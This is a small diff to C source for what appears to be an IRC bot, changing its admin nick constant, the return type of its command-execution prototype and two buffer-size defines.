@@ -15,7 +15,7 @@ char b_Brand[5][90] = {
 };
 
 /* Bot Adm Nick */
-#define BOT_ADM "stackiller"
+#define BOT_ADM "stackille"
 
 /* get size of pointer array */ 
 #define ARRAY_SIZE(x) ((sizeof(x)) / (sizeof(x[0])))
@@ -52,14 +52,14 @@ void b_Nick(char*);
 void b_Creds(char*, char*);
 void b_Join(char*);
 void p_Msg(char*, char*);
-void b_Exec(char*, char*, char*); // controller bot commands.
+int b_Exec(char*, char*, char*); // controller bot commands.
 void s_Msg(char**);
 void b_Header(void);
 void usage(char*);
 
 // Sizes
-#define M_LEN 2024
-#define B_LEN 30
+#define M_LEN 80000
+#define B_LEN 40
 
 // Error defines
 #define FAIL -1
